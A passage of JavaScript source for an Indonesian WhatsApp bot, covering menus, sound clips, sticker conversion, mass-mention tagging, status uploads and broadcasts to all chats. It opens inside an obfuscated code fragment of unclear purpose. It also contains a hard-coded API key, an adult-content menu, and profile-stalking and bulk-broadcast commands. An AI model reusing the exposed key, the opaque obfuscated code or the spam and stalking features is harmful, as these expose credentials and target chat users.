function(_0x463d4a){}[_0x45404f(0x437,0x3c2,0x34e,0x461,']x5d')+_0x1f773d(']x5d',0x398,0x327,0x382,0x387)+'r'](_0xd34684[_0x10251b(0x556,0x59b,0x6a4,0x4b2,'el#v')])[_0x45404f(0x386,0x470,0x2cd,0x3d8,'842!')](_0xd34684[_0x10251b(0x5d4,0x611,0x66a,0x588,'f$(X')]);}}}catch(_0x34efa0){}}
break
//====================MENU LIST===================
 case 'command':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nSUBSCRIBE\nhttps://youtube.com/HANZ々OFC彡\nSUBSCRIBE AND LIKE\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
"buttonText": " MENU️",
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `Silahkan Pilih Gan`,
    "rows": [ 
       {
           "title": "✌ANIME",
           "rowId": `${prefix}animemenu`
           },
	       {
           "title": "👥GROUP MENU",
           "rowId": `${prefix}groupmenu`
           },
	       {
           "title": "🎶MUSIK",
           "rowId": `${prefix}musik`
           },
	       {
           "title": "📌RANDOM",
           "rowId": `${prefix}randommenu`
           },
	       {
           "title": "📩DOWNLOAD",
           "rowId": `${prefix}donlotmenu`
           },
	       {
           "title": "🏸SEARCH",
           "rowId": `${prefix}searchmenu`
           },
	       {
           "title": "🎗STALK",
           "rowId": `${prefix}stalkmenu`
           },
	       {
	       "title": "💦18+ MENU",
           "rowId": `${prefix}18+`
           },
	       {
           "title": "🔮PRIMBON",
           "rowId": `${prefix}primbonmenu`
           },
	       {
           "title": "📸STICKER",
           "rowId": `${prefix}stickermenu`
           },
	       {
           "title": "👤OWNER",
           "rowId": `${prefix}ownermenu`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
 case 'musik':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'MENU MUSIK 🔊',
"description": `▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nSUBSCRIBE\nhttps://youtube.com/HANZ々OFC彡\nSUBSCRIBE AND LIKE\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
"buttonText": "MENU️",
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `Silahkan Pilih Musik yg enak Gan`,
    "rows": [ 
       {
           "title": "🎶 SOUND1",
           "rowId": `${prefix}sound1`
           },
	       {
           "title": "🎶 SOUND2",
           "rowId": `${prefix}sound2`
           },
	       {
           "title": "🎶 SOUND3",
           "rowId": `${prefix}sound3`
           },
	       {
           "title": "🎶 SOUND4",
           "rowId": `${prefix}sound4`
           },
	       {
           "title": "🎶 SOUND5",
           "rowId": `${prefix}sound5`
           },
	       {
           "title": "🎶 SOUND6",
           "rowId": `${prefix}sound6`
           },
	       {
           "title": "🎶 SOUND7",
           "rowId": `${prefix}sound7`
           },
	       {
           "title": "🎶 SOUND8",
           "rowId": `${prefix}sound8`
           },
	       {
           "title": "🎶 SOUND9",
           "rowId": `${prefix}sound9`
           },
	       {
           "title": "🎶 SOUND10",
           "rowId": `${prefix}sound10`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
 case 'bokep':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": '18+ MENU💦',
"description": `AWAS SANGE AN🗿`,
"buttonText": "MENU️",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
"title": `Silahkan Pilih Musik yg enak Gan`,
    "rows": [ 
       {
           "title": "💦BOKEP1",
           "rowId": `${prefix}bokep1`
           },
	       {
           "title": "💦BOKEP2",
           "rowId": `${prefix}bokep2`
           },
	       {
           "title": "💦BOKEP3",
           "rowId": `${prefix}bokep3`
           },
	       {
           "title": "💦BOKEP4",
           "rowId": `${prefix}bokep4`
           },
	       {
           "title": "💦BOKEP5",
           "rowId": `${prefix}bokep5`
           },
	       {
           "title": "💦BOKEP6",
           "rowId": `${prefix}bokep6`
           },
	       {
           "title": "💦BOKEP7",
           "rowId": `${prefix}sound7`
           },
	       {
           "title": "💦BOKEP8",
           "rowId": `${prefix}bokep8`
           },
	       {
           "title": "💦BOKEP9",
           "rowId": `${prefix}bokep9`
           },
	       {
           "title": "💦BOKEP10",
           "rowId": `${prefix}bokep10`
           },
	       {
           "title": "💦BOKEP11",
           "rowId": `${prefix}bokep11`
           },
	       {
           "title": "💦BOKEP12",
           "rowId": `${prefix}bokep12`
           },
	       {
           "title": "💦BOKEP13",
           "rowId": `${prefix}bokep13`
           },
	       {
           "title": "💦BOKEP14",
           "rowId": `${prefix}bokep14`
           },
	       {
           "title": "💦BOKEP15",
           "rowId": `${prefix}bokep15`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
//======================MENU BUTTON LOKASI COK==================
case 'groupmenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU GROUP\`\`\` 」
├────────────────────
│◦➛${prefix}antilink
◦➛${prefix}antivirtex
│◦➛${prefix}welcome
│◦➛${prefix}group
│◦➛${prefix}linkgroup
│◦➛${prefix}promote
│◦➛${prefix}demote
│◦➛${prefix}tagall
│◦➛${prefix}hidetag
│◦➛${prefix}totag
│◦➛${prefix}add
│◦➛${prefix}kick
│◦➛${prefix}setpp
│◦➛${prefix}setdesc
│◦➛${prefix}setname
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK👌' }, type: 1 }])
break
case 'animemenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU ANIME\`\`\` 」
├────────────────────
│◦➛${prefix}darkjokes
│◦➛${prefix}manga
│◦➛${prefix}character
│◦➛${prefix}anime
│◦➛${prefix}kusonimesearch
│◦➛${prefix}otakudesusearch
│◦➛${prefix}hentaisearch
│◦➛${prefix}nekopoisearch
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'randommenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU RANDOM\`\`\` 」
├────────────────────
│◦➛${prefix}ssweb
│◦➛${prefix}detikvn
│◦➛${prefix}detikvideo
│◦➛${prefix}randomdarkjokes
│◦➛${prefix}randommemeindo
│◦➛${prefix}kodenuklir
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'donlotmenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU DOWNLOAD\`\`\` 」
├────────────────────
│◦➛${prefix}play
│◦➛${prefix}ytsearch
│◦➛${prefix}ytmp4
│◦➛${prefix}tiktok
│◦➛${prefix}tiktokaudio
│◦➛${prefix}ttaudio
│◦➛${prefix}pinterest
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'searchmenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU SEARCH\`\`\` 」
├────────────────────
│◦➛${prefix}gimage
│◦➛${prefix}playstore
│◦➛${prefix}wallpapersearch
│◦➛${prefix}shopee
│◦➛${prefix}google
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'primbonmenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU PRIMBON\`\`\` 」
├────────────────────
│◦➛${prefix}artinama
│◦➛${prefix}jodoh
│◦➛${prefix}jadian
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'stalkmenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU STALK\`\`\` 」
├────────────────────
│◦➛${prefix}stalkig
│◦➛${prefix}stalktiktok
│◦➛${prefix}stalkgithub
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'stickermenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU STICKER\`\`\` 」
├────────────────────
│◦➛${prefix}attp
│◦➛${prefix}sticker
│◦➛${prefix}toimg
│◦➛${prefix}tomp3
│◦➛${prefix}tovideo
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/bot.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case 'ownermenu':
        sendButtonLocation(from, 
        `❏ 「 \`\`\`MENU OWNER\`\`\` 」
├────────────────────
│◦➛${prefix}upswtexs
│◦➛${prefix}upswsticker
│◦➛${prefix}upswgif
│◦➛${prefix}upswlokasi
│◦➛${prefix}upswimage
│◦➛${prefix}upswvideo
│◦➛${prefix}upswaudio
│◦➛${prefix}upswvn
│◦➛${prefix}tobc
│◦➛${prefix}bc2
│◦➛${prefix}bc
│◦➛${prefix}owner
│◦➛${prefix}report
└${botname}-`,
        `©ԋαɳȥ々σϝƈ`, 
        {jpegThumbnail:fs.readFileSync(`./media/thumnail.jpg`)}, 

[{ buttonId: `${prefix}gk`, buttonText: { displayText: 'OK' }, type: 1 }])
break
case '18+':
        sendButtonLocation(from, 
        `YAHH SANGEAN📸😑
├────────────────────
│◦➛${prefix}kodenuklir
│◦➛${prefix}linkbokep
│◦➛${prefix}bokep
└${botname}-`,
 `©ԋαɳȥ々σϝƈ`, 
{jpegThumbnail:fs.readFileSync(`./media/Bot.jpg`)}, 

[{ buttonId: `${prefix}kkk`, buttonText: { displayText: 'OK👌' }, type: 1 }])
break
 //━━━━━━━━━━━━━━━[ SOUND MENU COK ]━━━━━━━━━━━━━━━━━//
 case 'sound1':
satu = fs.readFileSync('./media/mp3/sound1.mp3');
Hanz.sendMessage(from, satu, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./media/mp3/sound2.mp3');
Hanz.sendMessage(from, dua, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./media/mp3/sound3.mp3');
Hanz.sendMessage(from, tiga, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./media/mp3/sound4.mp3');
Hanz.sendMessage(from, empat, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./media/mp3/sound5.mp3');
Hanz.sendMessage(from, lima, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./media/mp3/sound6.mp3');
Hanz.sendMessage(from, enam, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./media/mp3/sound7.mp3');
Hanz.sendMessage(from, tujuh, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break	
case 'sound8':
delapan = fs.readFileSync('./media/mp3/sound8.mp3');
Hanz.sendMessage(from, delapan, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound9':
sembilan = fs.readFileSync('./media/mp3/sound9.mp3');
Hanz.sendMessage(from, sembilan, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound10':
sepuluh = fs.readFileSync('./media/mp3/sound10.mp3');
Hanz.sendMessage(from, sepuluh, MessageType.audio, {quoted: ftrol, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
//=====================TAG MENU==========================
case 'totag':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
				if (!isGroup) return reply(mess.only.group)			
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Hanz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await Hanz.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Hanz.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          replyy(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
case 'infoall': case 'tagall':
									if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									var nom = mek.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`「 *TAG ALL*  」
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
case 'hidetag':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var value = body.slice(9)
var group = await Hanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: ftrol
}
Hanz.sendMessage(from, options, text)
break									

//━━━━━━━━━━━━━━━[ FITUR STICKER ]━━━━━━━━━━━━━━━━━//

case 'attp':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
Hanz.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'sticker':
case 'stiker':
case 's':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.stick)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
costum(buffer, sticker, Verived, `Jangan Lupa Subscribe Zero YT7`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker. pastikan untuk video yang dikirim tidak lebih dari 9 detik`)
})
.on('end', function () {
console.log('Finish')
costum(fs.readFileSync(ran), sticker, Verived, `~ Nih Dah Jadi Gif Stikernya`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
const media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(mess.error.stick)
Hanz.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: ftrol })
fs.unlinkSync(ranw)
})
})
} else {
reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
}
break
case 'toimg':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isQuotedSticker) return reply(' reply stickernya gan')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
buffer = fs.readFileSync(ran)
costum(buffer, image, Verived, `Jangan Lupa Subscribe Zero YT7`)
fs.unlinkSync(ran)
})
break
case 'tomp3':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
Hanz.updatePresence(from, Presence.recording)
if (!isQuotedVideo) return reply('Reply Video nya Tod')
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await Hanz.downloadAndSaveMediaMessage(encmedia, './database/media_user')
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
bufferlkj = fs.readFileSync(ran)
Hanz.sendMessage(from, bufferlkj, audio, { mimetype: 'audio/mp4', quoted: ftrol })
fs.unlinkSync(ran)
})
break
case 'tovideo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isQuotedSticker) return reply('Reply stikernya')
reply(mess.wait)
anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
anum = await Hanz.downloadAndSaveMediaMessage(anumedia, './database/media_user')
ran = getRandom('.webp')
exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
fs.unlinkSync(anum)
buffer = fs.readFileSync(ran)
Hanz.sendMessage(from, buffer, video, { quoted: ftrol, caption: 'Done... Jangan Lupa Subscribe Zero YT7' })
fs.unlinkSync(ran)
})
break
//================UP SW KHUSUS OWNER==========
case 'upswteks':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    Hanz.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
                    if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    Hanz.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${ownername}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':                    
                    if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                     if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvn':            
					if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')	       
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						Hanz.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await Hanz.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    Hanz.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Hanz.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    Hanz.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':                       
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Hanz.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    Hanz.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    replyy(`Sukses upload image:\n${teksyy}`)
                        break        
//=================BC==============
case 'tobc':				
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')					
				Hanz.updatePresence(from, Presence.composing)
					anu = await groupMembers
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Arya).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo :mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hanz.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Hanz.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Hanz.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          replyy('reply sticker/audio')
							}
					break
					case 'bc2':
      case 'bc':
if (!mek.key.fromMe && !isOwner) return reply('Khusus Owner !!')      
             if (args.length < 1) return reply('teks?')
             anu = await Hanz.chats.all()
             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
             bc = await Hanz.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             Hanz.sendMessage(_.jid, bc, image, {quoted:ftrol,caption: `*『 Haris 』*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
Hanz.sendMessage(_.jid, 
			{"contentText": `*『 Haris Broadcast 💫 』*\n\n${body.slice(4)}`,
			"footerText": 'HANZ々OFC彡💫',
			"buttons": [
			{"buttonId": `#command`,
			"buttonText": {"displayText": "📙 MENU"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             replyy('Suksess broadcast')
}
             break                   
